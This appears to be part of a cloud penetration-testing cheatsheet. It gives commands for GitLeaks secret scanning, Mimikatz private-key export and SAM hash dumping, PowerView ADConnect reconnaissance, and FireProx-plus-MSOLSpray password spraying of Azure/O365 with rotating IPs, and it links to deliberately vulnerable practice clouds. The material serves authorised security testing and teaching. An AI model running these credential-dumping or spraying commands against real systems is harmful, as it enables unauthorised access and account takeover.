# Cloud Pen-testing Part -6

````markdown
## GitLeaks

Search repositories for secrets

https://github.com/zricethezav/gitleaks

Pull GitLeaks with Docker

```shell
sudo docker pull zricethezav/gitleaks
````

Print the help menu

```shell
sudo docker run --rm --name=gitleaks zricethezav/gitleaks --help
```

Use GitLeaks to search for secrets

```shell
sudo docker run --rm --name=gitleaks zricethezav/gitleaks -v -r <repo URL>
```

### Mimikatz

Export Non-Exportable Private Keys From Web Server

```plaintext
mimikatz# crypto::capi
mimikatz# privilege::debug
mimikatz# crypto::cng
mimikatz# crypto::certificates /systemstore:local_machine /store:my /export
```

Dump password hashes from SAM/SYSTEM files

```plaintext
mimikatz# lsadump::sam /system:SYSTEM /sam:SAM
```

Check Command History

Linux Bash History Location

```plaintext
~/.bash_history
```

Windows PowerShell PSReadLine Location

```plaintext
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### PowerView

https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

Find on-prem ADConnect account name and server

```shell
Get-NetUser -Filter "(samAccountName=MSOL_*)" | Select-Object name,description | fl
```

### FireProx

Password Spraying Azure/O365 while randomizing IPs with FireProx

Install

```shell
git clone https://github.com/ustayready/fireprox
cd fireprox
virtualenv -p python3 .
source bin/activate
pip install -r requirements.txt
python fire.py
```

Launch FireProx

```shell
python fire.py --access_key <access_key_id> --secret_access_key <secret_access_key> --region <region> --url https://login.microsoft.com --command create
```

Password spray using FireProx + MSOLSpray

```shell
Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020 -URL https://apigateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox
```

### ip2Provider

Check a list of IP addresses against cloud provider IP space

https://github.com/oldrho/ip2provider

### Vulnerable Infrastructure Creation

Cloudgoat - https://github.com/RhinoSecurityLabs/cloudgoat

SadCloud - https://github.com/nccgroup/sadcloud

Flaws Cloud - http://flaws.cloud

Thunder CTF - http://thunder-ctf.cloud

```markdown
References and Resources
This is a list of references and resources that I leveraged to create the cheatsheets, but it is not comprehensive.
Huge thanks to all the cloud pentesting blog/book authors & open-source developers!

Rhino Security Labs @RhinoSecurity - Blog - Rhino Security Labs
Matt Burrough @mattburrough - Pentesting Azure Applications | No Starch Press
NCC Group @NCCGroupInfoSec - NCC Group Plc · GitHub
Sean Metcalf @PyroTek3 & Trimarc - AD Security
Karl Fosaaen @kfosaaen & NETSPI - NetSPI Blog
Ryan Hausknecht @haus3c & SpectorOps - Posts By SpecterOps Team Members
Steve Borosh @424f424f - rvrsh3ll Blog
Dirk-jan Mollema @_dirkjan - dirkjanm.io
Mike Felch @ustayready - ustayready (ustayready) · GitHub
Zachary Rice (@zricethezav) - zricethezav (Zachary Rice) · GitHub
Adam Chester @xpn - XPN InfoSec Blog
Chris Moberly @init_string & Gitlab - GitLab Security Department · GitLab
Lee Kagan @invokethreatguy & Lares - Blog | Resources | Lares Consulting, LLC
Oddvar Moe @Oddvarmoe & TrustedSec - Cybersecurity Education from the Experts | TrustedSec Blog Posts
```

`Please note that the above information is provided for reference purposes. Make sure to review and use these tools responsibly and ethically within the boundaries of applicable laws and regulations.`
